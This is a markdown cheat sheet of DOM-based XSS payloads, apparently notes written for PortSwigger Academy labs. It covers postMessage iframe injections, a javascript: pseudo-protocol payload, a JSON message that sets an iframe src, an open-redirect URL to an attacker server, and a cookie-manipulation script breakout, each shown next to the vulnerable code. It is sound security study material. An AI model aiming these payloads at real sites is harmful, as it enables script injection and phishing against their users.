# DOM-based Vulnerabilities

## Summary

* [Recon for DOM-based Vulnerabilities](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

## Recon

### Identify DOM-based Vulnerabilities

* DOM XSS happens when client-side JavaScript takes user-controllable input (source) and includes it into a dangerous function (sink).

* Use the Browser's Developers Tool and go to the Sources/Debugger tab.  In every page we can search for the keyword “script”, and we can also search through all the JavaScript files.

* In these files/pages, we can search for any **user-controllable sources** and **dangerous sinks** that the JavaScript is using.

* Analyze if JavaScript is taking any sources and including them into dangerous sinks.

* Search all static JavaScript files too.

* The labs in this document and in the [Cross-site Scripting/DOM XSS](#https://portswigger.net/web-security/cross-site-scripting/dom-based) section, include examples of user-controllable sources being used in dangerous sinks.


### Common Sources and Sinks

* https://portswigger.net/web-security/dom-based#common-sources

* https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities


---
---


## Cheat Sheet 


### Source - Web Messages

* Use web messages as a source to send malicious data to a target window that will take in that data and include it in a dangerous sink.  

    * Example:  window.postMessage(“\<img src=x onerror=alert(1)\>”)

```html
<iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
<br></br>
* **Vulnerable Code:**

```javascript
<script>
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
</script>
```

<br></br>
### Source - Web Messages location.href()

* Use web messages as a source to send malicious data to a target window that will take in that data and include it in a dangerous sink.  Example, the code will place the user-controllable input into the location.href sink, if the message contains the String “http:”. 

    * Example:  window.postMessage(“javascript:alert(1)//http:”)

```html
<iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
<br></br>

* **Vulnerable Code:**

```javascript
<script>
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>
```

<br></br>

### Source - Web Messages JSON.parse()

* There is a client-side script on the application that has an event listener that is listening for a web message.  It is possible to submit crafted input which will be included in the “src” attribute of an \<iframe\>.  This is essentially the “location.href” sink.  We can use a JavaScript pseudo-protocol payload here – javascript:print()

```html
<iframe src=https://VULNERABLE-APPLICATION.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

<br></br>

* **Vulnerable Code:**

```javascript
<script>
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
</script>
```

<br></br>

### DOM XSS - Open Redirection

* There was a client-side script on the application that is taking in a query parameter called “url” and using the value in a location.href Sink.  The URL needs to begin with “https://”.  The JavaScript Pseudo-protocol will not work here in this case.  This will simply redirect a user to a different website, can be used for phishing.

```
https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER.web-security-academy.net/
```


* **Vulnerable Code:**

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>
```

<br></br>

### DOM XSS - Cookie Manipulation

* The “window.location” source is being appended to a Cookie using the “document.cookie”.  This Cookie value is reflected back in the application's response within an HTML attribute.  Submit a crafted URL that will break out of the HTML context and execute JavaScript code.

    * Example:  \<a href='https://VULNERABLE-APP.net/product?productId=*user-input*'\>

    * Payload:  '\>\<script\>print()\</script\>

* The iframe will first load the vulnerable URL, which  will store it in "window.location" source.  Then the onload event will redirect to another page on the application, which will trigger the javascript, as the URL is reflected in the response.

```html
<iframe src="https://VULNERABLE-APP.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://VULNERABLE-APP.net';window.x=1;">
```

